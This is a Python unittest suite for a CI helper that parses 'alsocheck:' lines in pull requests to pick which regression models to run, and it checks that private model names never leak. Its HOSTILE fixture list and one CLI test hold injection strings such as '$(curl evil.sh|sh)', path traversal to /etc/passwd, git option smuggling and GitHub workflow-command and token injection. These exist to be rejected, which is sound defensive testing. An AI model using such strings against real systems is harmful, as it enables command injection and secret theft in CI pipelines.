#!/usr/bin/env python3
"""Tests for alsocheck.py, and for what alsocheck changed in shard_list.py
and merge_summaries.py. Hermetic: no corpus, no network, no runner.

    python3 -m unittest discover -s .github/actions/regression-shard -p 'test_*.py'

`build` runs this beside `shard_list.py check`.
"""

from __future__ import annotations

import json
import os
import shutil
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

HERE = Path(__file__).resolve().parent
REPO = HERE.parent.parent.parent
sys.path.insert(0, str(HERE))

import alsocheck  # noqa: E402
import shard_list  # noqa: E402

SHARDS = REPO / 'regression' / 'shards'
HEADLINE = ['AHMAC555', 'BLSN282', 'D3D224', 'DOWA418', 'ILNA250', 'O10',
            'PSB900']
TREE = {'ifc/foo/bar.ifc', 'step/nist/x.stp',
        'ifc/misc/Stohr - IFC Test.ifc', 'ifc/citra/House (1).ifc'}

# Entries that must never be accepted. Each is also checked to never
# appear in an error message.
HOSTILE = [
    '$(curl evil.sh|sh).ifc',
    '`touch pwned`',
    'ifc/`id`.ifc',
    '../etc/passwd.ifc',
    'ifc/../../x.ifc',
    'ifc/./x.ifc',
    '/etc/x.ifc',
    'ifc//x.ifc',
    'ifc/-rf.ifc',
    '--upload-pack=x.ifc',
    'ifc/x;rm.ifc',
    'ifc/x|y.ifc',
    'ifc/x&y.ifc',
    "ifc/x'y.ifc",
    'ifc/x\\y.ifc',
    'ifc/*.ifc',
    'ifc/[ab].ifc',
    'ifc/x?.ifc',
    '::set-output name=x::y',
    '::add-mask::secret.ifc',
    'ifc/x.ifc:extra',
    '${{github.token}}.ifc',
    'ifc/х.ifc',          # Cyrillic lookalike
    'ifc/x.ifc​',         # zero-width space
    'ifc/x.txt',
    'ifc/x',
    'ilna250',
    'notes.md',
    'a' * 300 + '.ifc',
    'ABCDEFGHIJKLMNOPQRSTU1',  # code-shaped, too long
]


def parse_body(body: str) -> alsocheck.Selection:
    return alsocheck.parse(alsocheck.request_lines(body))


class ParserTest(unittest.TestCase):

    def test_basic_line(self):
        sel = parse_body('Fixes #1.\n\nalsocheck: ILNA250, ifc/foo/bar.ifc\n')
        self.assertEqual(sel.codes, ['ILNA250'])
        self.assertEqual(sel.paths, ['ifc/foo/bar.ifc'])
        self.assertEqual(sel.errors, [])

    def test_key_any_case_and_spacing(self):
        for line in ('ALSOCHECK: O10', 'AlsoCheck : O10', '  alsocheck:O10',
                     '\talsocheck :  O10  '):
            with self.subTest(line=line):
                self.assertEqual(parse_body(line).codes, ['O10'])

    def test_space_and_comma_separators(self):
        sel = parse_body('alsocheck: O10 PSB900,,D3D224 ,  ifc/foo/bar.ifc')
        self.assertEqual(sel.codes, ['O10', 'PSB900', 'D3D224'])
        self.assertEqual(sel.paths, ['ifc/foo/bar.ifc'])

    def test_crlf_body(self):
        sel = parse_body('Fix.\r\nalsocheck: O10\r\nmore text\r\n')
        self.assertEqual(sel.codes, ['O10'])
        self.assertEqual(sel.errors, [])

    def test_several_lines_union_and_dedupe(self):
        sel = parse_body('alsocheck: O10\ntext\nalsocheck: O10, PSB900')
        self.assertEqual(sel.codes, ['O10', 'PSB900'])

    def test_only_at_line_start(self):
        sel = parse_body('We should alsocheck: O10 some day.\n'
                         '> alsocheck: PSB900\n- alsocheck: D3D224\n')
        self.assertEqual(sel.count, 0)
        self.assertEqual(sel.errors, [])

    def test_comments_and_fences_ignored(self):
        body = ('<!-- alsocheck: O10 -->\n'
                '<!--\nalsocheck: PSB900\n-->\n'
                '```\nalsocheck: D3D224\n```\n'
                '~~~text\nalsocheck: BLSN282\n~~~\n'
                'alsocheck: ILNA250\n')
        self.assertEqual(parse_body(body).codes, ['ILNA250'])

    def test_no_line_no_selection(self):
        sel = parse_body('Nothing to see.\n\nalsocheckx: O10\n')
        self.assertEqual((sel.count, sel.errors), (0, []))

    def test_empty_value(self):
        sel = parse_body('alsocheck:\n')
        self.assertEqual((sel.count, sel.errors), (0, []))

    def test_backticks_enclosing_are_stripped(self):
        sel = parse_body('alsocheck: `ifc/foo/bar.ifc`, `O10`')
        self.assertEqual(sel.paths, ['ifc/foo/bar.ifc'])
        self.assertEqual(sel.codes, ['O10'])

    def test_quoted_path_with_spaces(self):
        sel = parse_body('alsocheck: "ifc/misc/Stohr - IFC Test.ifc", '
                         '"ifc/citra/House (1).ifc"')
        self.assertEqual(sel.errors, [])
        self.assertEqual(sel.paths, ['ifc/misc/Stohr - IFC Test.ifc',
                                     'ifc/citra/House (1).ifc'])

    def test_quoted_hostile(self):
        for entry in ('"ifc/$(id).ifc"', '"ifc/a`b`.ifc"', '"../x.ifc"',
                      '"ifc/ x.ifc"', '"ifc/x .ifc "', '"ifc/x,y.ifc"'):
            with self.subTest(entry=entry):
                sel = parse_body('alsocheck: ' + entry)
                self.assertEqual(sel.count, 0)
                self.assertTrue(sel.errors)

    def test_unbalanced_quote_rejected(self):
        sel = parse_body('alsocheck: "ifc/foo/bar.ifc')
        self.assertEqual(sel.count, 0)
        self.assertTrue(sel.errors)

    def test_hostile_entries_rejected_and_never_echoed(self):
        for entry in HOSTILE:
            with self.subTest(entry=entry[:40]):
                sel = parse_body('alsocheck: ' + entry)
                self.assertEqual(sel.count, 0, entry)
                self.assertTrue(sel.errors, entry)
                for message in sel.errors:
                    self.assertNotIn(entry, message)
                    # Nor any distinctive fragment of it.
                    for bit in ('curl', 'pwned', 'passwd', 'set-output',
                                'add-mask', 'secret', 'github.token'):
                        if bit in entry:
                            self.assertNotIn(bit, message)

    def test_hostile_entry_does_not_poison_others(self):
        sel = parse_body('alsocheck: O10, $(id), ifc/foo/bar.ifc')
        self.assertEqual(sel.codes, ['O10'])
        self.assertEqual(sel.paths, ['ifc/foo/bar.ifc'])
        self.assertEqual(len(sel.errors), 1)
        self.assertIn('entry 2', sel.errors[0])

    def test_newline_cannot_extend_an_entry(self):
        # The second line is not part of the alsocheck value.
        sel = parse_body('alsocheck: O10\n::set-output name=x::y\nPSB900')
        self.assertEqual(sel.codes, ['O10'])
        self.assertEqual(sel.errors, [])

    def test_private_path_hint_names_code_only(self):
        sel = parse_body('alsocheck: ILNA250.ifc')
        self.assertEqual(sel.count, 0)
        self.assertIn('`ILNA250`', sel.errors[0])
        self.assertNotIn('ILNA250.ifc', sel.errors[0])

    def test_cap(self):
        sel = parse_body('alsocheck: ' + ', '.join(
            f'C{i}' for i in range(1, alsocheck.MAX_ENTRIES + 1)))
        self.assertEqual(len(sel.codes), alsocheck.MAX_ENTRIES)
        sel = parse_body('alsocheck: ' + ', '.join(
            f'C{i}' for i in range(1, alsocheck.MAX_ENTRIES + 2)))
        self.assertEqual(sel.count, 0)
        self.assertIn('at most', sel.errors[0])

    def test_very_long_list_refused_whole(self):
        sel = parse_body('alsocheck: ' + ' '.join(['ifc/foo/bar.ifc'] * 10000))
        self.assertEqual(sel.count, 0)
        self.assertEqual(len(sel.errors), 1)

    def test_huge_body_is_bounded(self):
        body = ('x' * 100000) + '\nalsocheck: O10\n'
        self.assertEqual(parse_body(body).count, 0)

    def test_dispatch_input_with_or_without_key(self):
        for value in ('ILNA250, ifc/foo/bar.ifc',
                      'alsocheck: ILNA250 ifc/foo/bar.ifc'):
            with self.subTest(value=value):
                sel = alsocheck.parse(alsocheck.dispatch_lines(value))
                self.assertEqual(sel.codes, ['ILNA250'])
                self.assertEqual(sel.paths, ['ifc/foo/bar.ifc'])

    def test_code_regex_is_shard_lists(self):
        # One definition of a code, shared with shard_list.py check.
        self.assertIs(alsocheck.CODE_RE, shard_list.CODE_RE)


def env_for(event, body='', **extra):
    env = {'EVENT_NAME': event, 'PR_BODY': body, 'IS_FORK': 'false',
           'WRITE_TOKEN_PRESENT': 'true'}
    env.update(extra)
    return env


class ResolveTest(unittest.TestCase):

    def resolve(self, env, tree=TREE):
        outputs, summary, errors = alsocheck.resolve(env, SHARDS, tree)
        return outputs, '\n'.join(summary), errors

    def test_headline_codes_from_lists(self):
        self.assertEqual(alsocheck.headline_codes(SHARDS), HEADLINE)

    def test_push_runs_everything(self):
        out, _, errors = self.resolve(env_for('push'), tree=None)
        self.assertEqual(errors, [])
        self.assertEqual(out['private_scope'], 'all')
        self.assertEqual(out['private_expected'], 'true')
        self.assertEqual(out['private_needed'], 'true')
        self.assertEqual(out['alsocheck_matrix'], '[]')
        self.assertEqual(out['private_render'], 'none')

    def test_push_ignores_bodies(self):
        out, _, _ = self.resolve(env_for('push', 'alsocheck: ifc/foo/bar.ifc'))
        self.assertEqual(out['alsocheck_public_count'], '0')

    def test_pr_without_alsocheck(self):
        out, _, errors = self.resolve(env_for('pull_request', 'Fix.'))
        self.assertEqual(errors, [])
        self.assertEqual(out['private_scope'], 'none')
        self.assertEqual(out['private_expected'], 'false')
        self.assertEqual(out['private_needed'], 'false')
        self.assertEqual(out['private_selected'], '')
        self.assertEqual(out['alsocheck_matrix'], '[]')
        self.assertEqual(out['private_render'], 'none')

    def test_pr_public_only(self):
        out, summary, errors = self.resolve(
            env_for('pull_request', 'alsocheck: ifc/foo/bar.ifc'))
        self.assertEqual(errors, [])
        self.assertEqual(out['private_expected'], 'false')
        self.assertEqual(out['private_needed'], 'false')
        self.assertEqual(json.loads(out['alsocheck_public']),
                         ['ifc/foo/bar.ifc'])
        self.assertEqual(json.loads(out['alsocheck_matrix']),
                         [{'id': 'alsocheck-public', 'corpus': 'public'}])
        self.assertIn('`ifc/foo/bar.ifc` (public)', summary)

    def test_pr_path_not_in_public_corpus_is_rejected_unnamed(self):
        secret = 'ifc/client/Secret Tower.ifc'
        out, summary, errors = self.resolve(
            env_for('pull_request', f'alsocheck: "{secret}"'))
        self.assertTrue(errors)
        for text in errors + [summary] + list(out.values()):
            self.assertNotIn('Secret', text)

    def test_pr_path_without_listing_is_an_error(self):
        _, _, errors = self.resolve(
            env_for('pull_request', 'alsocheck: ifc/foo/bar.ifc'), tree=None)
        self.assertTrue(errors)

    def test_pr_headline_code(self):
        out, summary, errors = self.resolve(
            env_for('pull_request', 'alsocheck: ILNA250'))
        self.assertEqual(errors, [])
        self.assertEqual(out['private_scope'], 'selected')
        self.assertEqual(out['private_expected'], 'true')
        self.assertEqual(out['private_selected'], 'ILNA250')
        self.assertEqual(out['private_needed'], 'true')
        self.assertEqual(out['alsocheck_matrix'], '[]')
        self.assertEqual(out['private_render'], 'true')
        self.assertIn('visual-diff-assets', summary)

    def test_pr_headline_code_without_write_token(self):
        out, summary, _ = self.resolve(env_for(
            'pull_request', 'alsocheck: ILNA250', WRITE_TOKEN_PRESENT='false'))
        self.assertEqual(out['private_render'], 'no-write-token')
        self.assertEqual(out['private_scope'], 'selected')
        self.assertIn('TEST_MODELS_PRIVATE_WRITE_TOKEN', summary)

    def test_pr_non_headline_code(self):
        out, _, errors = self.resolve(
            env_for('pull_request', 'alsocheck: XYZ12, ifc/foo/bar.ifc'))
        self.assertEqual(errors, [])
        self.assertEqual(out['private_scope'], 'none')
        self.assertEqual(out['private_expected'], 'false')
        self.assertEqual(out['private_needed'], 'true')
        self.assertEqual(json.loads(out['alsocheck_private_extra']), ['XYZ12'])
        self.assertEqual([e['id'] for e in json.loads(out['alsocheck_matrix'])],
                         ['alsocheck-public', 'alsocheck-private'])

    def test_fork_drops_private_keeps_public(self):
        out, summary, errors = self.resolve(env_for(
            'pull_request', 'alsocheck: ILNA250 XYZ12 ifc/foo/bar.ifc',
            IS_FORK='true', WRITE_TOKEN_PRESENT='false'))
        self.assertEqual(errors, [])
        self.assertEqual(out['private_scope'], 'none')
        self.assertEqual(out['private_expected'], 'false')
        self.assertEqual(out['private_needed'], 'false')
        self.assertEqual(out['alsocheck_private'], '[]')
        self.assertEqual(out['alsocheck_private_skipped'], 'fork')
        self.assertEqual(out['private_render'], 'fork')
        self.assertEqual(json.loads(out['alsocheck_private_requested']),
                         ['ILNA250', 'XYZ12'])
        self.assertEqual(json.loads(out['alsocheck_matrix']),
                         [{'id': 'alsocheck-public', 'corpus': 'public'}])
        self.assertIn('fork', summary)

    def test_dispatch_run_private_shards_still_works(self):
        out, _, _ = self.resolve(env_for('workflow_dispatch',
                                         RUN_PRIVATE_SHARDS='true'))
        self.assertEqual(out['private_scope'], 'all')
        out, _, _ = self.resolve(env_for('workflow_dispatch',
                                         RUN_PRIVATE_SHARDS='false'))
        self.assertEqual(out['private_scope'], 'none')
        self.assertEqual(out['private_needed'], 'false')

    def test_dispatch_alsocheck_input(self):
        out, _, errors = self.resolve(env_for(
            'workflow_dispatch', DISPATCH_ALSOCHECK='O10, ifc/foo/bar.ifc'))
        self.assertEqual(errors, [])
        self.assertEqual(out['private_selected'], 'O10')
        self.assertEqual(out['alsocheck_public_count'], '1')
        self.assertEqual(out['private_render'], 'true')

    def test_dispatch_all_plus_alsocheck_headline(self):
        out, _, _ = self.resolve(env_for(
            'workflow_dispatch', DISPATCH_ALSOCHECK='O10',
            RUN_PRIVATE_SHARDS='true'))
        self.assertEqual(out['private_scope'], 'all')
        self.assertEqual(out['private_selected'], '')
        self.assertEqual(out['private_render'], 'true')

    def test_body_ignored_on_dispatch(self):
        out, _, _ = self.resolve(env_for('workflow_dispatch', 'alsocheck: O10'))
        self.assertEqual(out['private_scope'], 'none')

    def test_outputs_are_single_line(self):
        out, _, _ = self.resolve(env_for(
            'pull_request', 'alsocheck: "ifc/misc/Stohr - IFC Test.ifc" O10'))
        for value in out.values():
            self.assertNotIn('\n', value)

    def test_resolve_cli_fails_without_echo(self):
        with tempfile.TemporaryDirectory() as tmp:
            body = Path(tmp) / 'body.txt'
            body.write_text('alsocheck: $(curl evil|sh) ::add-mask::x\n')
            done = subprocess.run(
                [sys.executable, str(HERE / 'alsocheck.py'), 'resolve',
                 '--shard-dir', str(SHARDS), '--body-file', str(body)],
                env={**os.environ, 'EVENT_NAME': 'pull_request',
                     'GITHUB_OUTPUT': str(Path(tmp) / 'out'),
                     'GITHUB_STEP_SUMMARY': str(Path(tmp) / 'sum')},
                capture_output=True, text=True, check=False)
            self.assertEqual(done.returncode, 1)
            self.assertNotIn('curl', done.stdout + done.stderr)
            self.assertNotIn('add-mask', done.stdout + done.stderr)
            self.assertFalse((Path(tmp) / 'out').exists())

    def test_resolve_cli_writes_outputs(self):
        with tempfile.TemporaryDirectory() as tmp:
            tree = Path(tmp) / 'tree.z'
            tree.write_bytes(b'\0'.join(p.encode() for p in TREE))
            body = Path(tmp) / 'body.txt'
            body.write_text('alsocheck: ILNA250 ifc/foo/bar.ifc\n')
            done = subprocess.run(
                [sys.executable, str(HERE / 'alsocheck.py'), 'resolve',
                 '--shard-dir', str(SHARDS), '--body-file', str(body),
                 '--public-tree', str(tree)],
                env={**os.environ, 'EVENT_NAME': 'pull_request',
                     'IS_FORK': 'false', 'WRITE_TOKEN_PRESENT': 'false',
                     'GITHUB_OUTPUT': str(Path(tmp) / 'out'),
                     'GITHUB_STEP_SUMMARY': str(Path(tmp) / 'sum')},
                capture_output=True, text=True, check=False)
            self.assertEqual(done.returncode, 0, done.stdout + done.stderr)
            lines = (Path(tmp) / 'out').read_text().splitlines()
            got = dict(line.split('=', 1) for line in lines)
            self.assertEqual(got['private_selected'], 'ILNA250')
            self.assertEqual(got['private_render'], 'no-write-token')


class ValidatedEntriesTest(unittest.TestCase):

    def test_accepts_producer_output(self):
        self.assertEqual(alsocheck.validated_entries(
            'public', json.dumps(['ifc/foo/bar.ifc',
                                  'ifc/misc/Stohr - IFC Test.ifc'])),
            ['ifc/foo/bar.ifc', 'ifc/misc/Stohr - IFC Test.ifc'])
        self.assertEqual(alsocheck.validated_entries('private', '["O10"]'),
                         ['O10'])

    def test_rejects_tampered_output(self):
        for corpus, raw in (
                ('public', '["../x.ifc"]'),
                ('public', '["ifc/$(id).ifc"]'),
                ('public', '["O10"]'),            # a code in a public list
                ('private', '["ifc/foo/bar.ifc"]'),
                ('private', '["O10\\nPSB900"]'),
                ('private', '"O10"'),
                ('private', '{"a": 1}'),
                ('private', 'not json'),
                ('private', json.dumps(['C1'] * 6))):
            with self.subTest(raw=raw):
                with self.assertRaises(SystemExit):
                    alsocheck.validated_entries(corpus, raw)

    def test_write_list_round_trips_through_shard_list(self):
        with tempfile.TemporaryDirectory() as tmp:
            out = Path(tmp) / 'alsocheck' / 'alsocheck-public.txt'
            done = subprocess.run(
                [sys.executable, str(HERE / 'alsocheck.py'), 'write-list',
                 '--corpus', 'public', '--out', str(out)],
                env={**os.environ,
                     'ENTRIES': '["ifc/foo/bar.ifc", "step/nist/x.stp"]'},
                capture_output=True, text=True, check=True)
            self.assertIn('2 public model(s)', done.stdout)
            corpus, names = shard_list.parse_shard(str(out))
            self.assertEqual(corpus, 'public')
            # Basenames: the CSVs a summary scopes by are keyed by them.
            self.assertEqual(names, ['bar.ifc', 'x.stp'])


class VerifyArtifactsTest(unittest.TestCase):

    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp())
        self.addCleanup(shutil.rmtree, self.tmp)

    def mk(self, *ids):
        for shard in ids:
            (self.tmp / f'regression-shard-{shard}').mkdir()

    def verify(self, scope, selected=(), matrix=()):
        return alsocheck.verify_artifacts(self.tmp, SHARDS, scope,
                                          list(selected), list(matrix))

    def test_none(self):
        self.mk('coverage-1')
        self.assertEqual(self.verify('none'), [])

    def test_none_but_a_private_shard_ran(self):
        self.mk('coverage-1', 'PSB900')
        errors = self.verify('none')
        self.assertEqual(len(errors), 1)
        self.assertIn('PSB900', errors[0])

    def test_selected(self):
        self.mk('ILNA250')
        self.assertEqual(self.verify('selected', ['ILNA250']), [])

    def test_selected_missing(self):
        errors = self.verify('selected', ['ILNA250'])
        self.assertIn('ILNA250', errors[0])

    def test_unselected_ran(self):
        self.mk('ILNA250', 'O10')
        errors = self.verify('selected', ['ILNA250'])
        self.assertEqual(len(errors), 1)
        self.assertIn('O10', errors[0])

    def test_all(self):
        self.mk(*HEADLINE)
        self.assertEqual(self.verify('all'), [])
        shutil.rmtree(self.tmp / 'regression-shard-O10')
        self.assertIn('O10', self.verify('all')[0])

    def test_alsocheck_jobs(self):
        matrix = [{'id': 'alsocheck-public', 'corpus': 'public'}]
        self.assertTrue(self.verify('none', matrix=matrix))
        self.mk('alsocheck-public')
        self.assertEqual(self.verify('none', matrix=matrix), [])
        self.assertTrue(self.verify('none'))


class PrivateRenderCommentTest(unittest.TestCase):

    def test_codes_and_links_only(self):
        with tempfile.TemporaryDirectory() as tmp:
            png = Path(tmp)
            (png / 'ILNA250-before.png').write_bytes(b'x')
            (png / 'ILNA250-after.png').write_bytes(b'x')
            (png / 'report.md').write_text('| `Secret.ifc` | ![b](x) | 12.3% |')
            lines = alsocheck.private_render_comment(
                ['ILNA250', 'XYZ12'], png, 'bldrs-ai/test-models-private',
                'a' * 40, 'conway/pr-7/99', pushed=True)
        text = '\n'.join(lines)
        self.assertIn('1 of 2 private model(s) rendered', text)
        self.assertIn('blob/' + 'a' * 40 + '/conway/pr-7/99/ILNA250-before.png',
                      text)
        self.assertNotIn('![', text)       # links, never embeds
        self.assertNotIn('%', text)        # no pixel figures
        self.assertNotIn('Secret', text)   # nothing from the report

    def test_not_pushed(self):
        text = '\n'.join(alsocheck.private_render_comment(
            ['O10'], Path('/nonexistent'), 'r/p', '', '', pushed=False))
        self.assertIn('nothing was published', text)
        self.assertNotIn('O10-before', text)


class ShardListTest(unittest.TestCase):

    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp())
        self.addCleanup(shutil.rmtree, self.tmp)

    def test_find_paths_exact_and_basename(self):
        root = self.tmp / 'models'
        for rel in ('ifc/a/x.ifc', 'ifc/b/x.ifc', 'ifc/c/y.ifc'):
            (root / rel).parent.mkdir(parents=True, exist_ok=True)
            (root / rel).write_text('ISO')
        # Exact path: only that file, not its same-named sibling.
        self.assertEqual(shard_list.find_paths(root, ['ifc/b/x.ifc']),
                         ['ifc/b/x.ifc'])
        self.assertEqual(
            shard_list.find_paths(root, ['ifc/b/x.ifc', 'y.ifc']),
            ['ifc/b/x.ifc', 'ifc/c/y.ifc'])
        with self.assertRaises(SystemExit):
            shard_list.find_paths(root, ['ifc/nope/x.ifc'])

    def test_regex_selects_exact_path(self):
        import re
        regex = re.compile(shard_list.exclude_regex(['ifc/b/x.ifc']))
        # The batch EXCLUDES what matches.
        self.assertIsNone(regex.match('models/ifc/b/x.ifc'))
        self.assertIsNotNone(regex.match('models/ifc/a/x.ifc'))

    def test_link_by_code(self):
        root = self.tmp / 'models'
        (root / 'regression').mkdir(parents=True)
        (root / 'ifc' / 'client').mkdir(parents=True)
        (root / 'ifc' / 'client' / 'Real Secret Name.IFC').write_text('ISO')
        (root / 'regression' / 'shard_codes.txt').write_text(
            'ILNA250  ifc/client/Real Secret Name.IFC\n')
        shard = self.tmp / 'p.txt'
        shard.write_text('# corpus: private\nILNA250\n')
        out = self.tmp / 'abs.txt'
        done = subprocess.run(
            [sys.executable, str(HERE / 'shard_list.py'), 'link', str(shard),
             str(root), str(self.tmp / 'by-code'), '--out', str(out)],
            env={**os.environ, 'GITHUB_WORKSPACE': str(self.tmp)},
            capture_output=True, text=True, check=True)
        self.assertNotIn('Secret', done.stdout + done.stderr)
        listed = out.read_text().split()
        self.assertEqual([Path(p).name for p in listed], ['ILNA250.ifc'])
        self.assertTrue(Path(listed[0]).is_symlink())
        self.assertEqual(Path(listed[0]).read_text(), 'ISO')

    def test_check_reserves_alsocheck_ids(self):
        shards = self.tmp / 'shards'
        shutil.copytree(SHARDS, shards)
        (shards / 'alsocheck-public.txt').write_text(
            '# corpus: public\nfoo.ifc\n')
        done = subprocess.run(
            [sys.executable, str(HERE / 'shard_list.py'), 'check',
             '--shard-dir', str(shards),
             '--smoke', str(REPO / 'regression' / 'smoke_models.txt'),
             '--workflow', str(REPO / '.github' / 'workflows' / 'build.yml')],
            capture_output=True, text=True, check=False)
        self.assertEqual(done.returncode, 1)
        self.assertIn('reserved', done.stdout)

    def test_check_passes_on_the_repo_without_pyyaml(self):
        # The strict include-block scan must still read both matrices
        # after this change; force the no-PyYAML path.
        code = ('import sys, runpy; sys.modules["yaml"] = None; '
                f'sys.argv = ["shard_list.py", "check"]; '
                f'runpy.run_path({str(HERE / "shard_list.py")!r}, '
                'run_name="__main__")')
        done = subprocess.run(
            [sys.executable, '-c', code], cwd=REPO,
            env={k: v for k, v in os.environ.items()
                 if k != 'GITHUB_WORKSPACE'},
            capture_output=True, text=True, check=False)
        self.assertEqual(done.returncode, 0, done.stdout + done.stderr)
        self.assertIn('strict include-block scan', done.stdout)
        self.assertIn('10 shard list(s) OK', done.stdout)


class MergeSummariesTest(unittest.TestCase):
    """merge_summaries.py over fake artifact trees."""

    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp())
        self.addCleanup(shutil.rmtree, self.tmp)
        self.art = self.tmp / 'shards-in'
        self.art.mkdir()

    def frag(self, *ids):
        for shard in ids:
            d = self.art / f'regression-shard-{shard}'
            d.mkdir()
            (d / 'shard_summary.md').write_text(
                f'<h3>{shard}</h3>\n\nfragment of {shard}\n')

    def merge(self, *args):
        out = self.tmp / 'comment.md'
        done = subprocess.run(
            [sys.executable, str(HERE / 'merge_summaries.py'),
             '--artifacts', str(self.art), '--shard-dir', str(SHARDS),
             '--out', str(out), '--public-sha', 'p' * 40, *args],
            env={k: v for k, v in os.environ.items() if k != 'GITHUB_OUTPUT'},
            capture_output=True, text=True, check=True)
        return out.read_text(), done.stdout

    def test_no_alsocheck_pr(self):
        self.frag('coverage-1', 'coverage-2', 'coverage-3')
        text, log = self.merge('--private-reason', 'not-on-prs',
                               '--private-scope', 'none')
        self.assertNotIn('[!WARNING]', text)
        self.assertNotIn('### alsocheck', text)
        self.assertIn('Headline shards (not run on pull requests)', text)
        self.assertIn('7 not run, 0 missing', log)

    def test_legacy_invocation_unchanged(self):
        # No --private-scope: inferred from --private-sha as before.
        self.frag('coverage-1', 'coverage-2', 'coverage-3')
        text, _ = self.merge('--private-reason', 'not-on-prs')
        self.assertNotIn('[!WARNING]', text)
        self.frag(*HEADLINE)
        text, _ = self.merge('--private-sha', 'q' * 40)
        self.assertNotIn('[!WARNING]', text)

    def test_push_all_missing_one(self):
        self.frag('coverage-1', 'coverage-2', 'coverage-3',
                  *[c for c in HEADLINE if c != 'O10'])
        text, _ = self.merge('--private-sha', 'q' * 40,
                             '--private-scope', 'all')
        self.assertIn('[!WARNING]', text)
        self.assertIn('`O10`', text.split('[!WARNING]')[1].split('\n\n')[0])
        self.assertNotIn('### alsocheck', text)

    def test_alsocheck_public_only(self):
        self.frag('coverage-1', 'coverage-2', 'coverage-3', 'alsocheck-public')
        text, log = self.merge(
            '--private-reason', 'not-on-prs', '--private-scope', 'none',
            '--alsocheck-public', '["ifc/foo/bar.ifc"]')
        self.assertNotIn('[!WARNING]', text)
        also = text.split('### alsocheck')[1].split('### Fixed shards')[0]
        self.assertIn('`ifc/foo/bar.ifc` (public)', also)
        self.assertIn('fragment of alsocheck-public', also)
        self.assertIn('rendered before/after unconditionally', also)
        self.assertLess(text.index('fragment of alsocheck-public'),
                        text.index('fragment of coverage-1'))
        self.assertIn('4/11 shard', log)

    def test_alsocheck_private_headline_code(self):
        self.frag('coverage-1', 'coverage-2', 'coverage-3', 'ILNA250')
        text, _ = self.merge(
            '--private-sha', 'q' * 40, '--private-reason', 'no-token',
            '--private-scope', 'selected', '--private-selected', 'ILNA250',
            '--alsocheck-private', '["ILNA250"]', '--private-render', 'true')
        # Unselected headline shards are "not selected", never "failed".
        self.assertNotIn('[!WARNING]', text)
        self.assertNotIn('failed before', text)
        self.assertIn('not selected', text)
        self.assertIn('(alsocheck selection only)', text)
        also = text.split('### alsocheck')[1].split('### Fixed shards')[0]
        self.assertIn('fragment of ILNA250', also)
        self.assertIn('`ILNA250` (private)', also)
        self.assertIn('bldrs-ai/test-models-private', also)

    def test_alsocheck_private_selected_but_missing(self):
        self.frag('coverage-1', 'coverage-2', 'coverage-3')
        text, _ = self.merge(
            '--private-sha', 'q' * 40, '--private-scope', 'selected',
            '--private-selected', 'ILNA250',
            '--alsocheck-private', '["ILNA250"]', '--private-render', 'true')
        warning = text.split('[!WARNING]')[1].split('\n\n')[0]
        self.assertIn('`ILNA250`', warning)
        self.assertNotIn('`O10`', warning)

    def test_alsocheck_private_no_write_token(self):
        self.frag('coverage-1', 'coverage-2', 'coverage-3', 'ILNA250',
                  'alsocheck-private')
        text, _ = self.merge(
            '--private-sha', 'q' * 40, '--private-scope', 'selected',
            '--private-selected', 'ILNA250',
            '--alsocheck-private', '["ILNA250", "XYZ12"]',
            '--private-render', 'no-write-token')
        self.assertNotIn('[!WARNING]', text)
        also = text.split('### alsocheck')[1].split('### Fixed shards')[0]
        self.assertIn('TEST_MODELS_PRIVATE_WRITE_TOKEN', also)
        self.assertIn('fragment of alsocheck-private', also)
        self.assertIn('fragment of ILNA250', also)

    def test_fork(self):
        self.frag('coverage-1', 'coverage-2', 'coverage-3', 'alsocheck-public')
        text, _ = self.merge(
            '--private-reason', 'not-on-prs', '--private-scope', 'none',
            '--alsocheck-public', '["ifc/foo/bar.ifc"]',
            '--alsocheck-private', '["ILNA250", "XYZ12"]',
            '--alsocheck-private-skipped', 'fork', '--private-render', 'fork')
        self.assertNotIn('[!WARNING]', text)
        also = text.split('### alsocheck')[1].split('### Fixed shards')[0]
        self.assertIn('fork', also)
        self.assertIn('`XYZ12`', also)
        self.assertNotIn('visual-diff-assets', also)


if __name__ == '__main__':
    unittest.main()
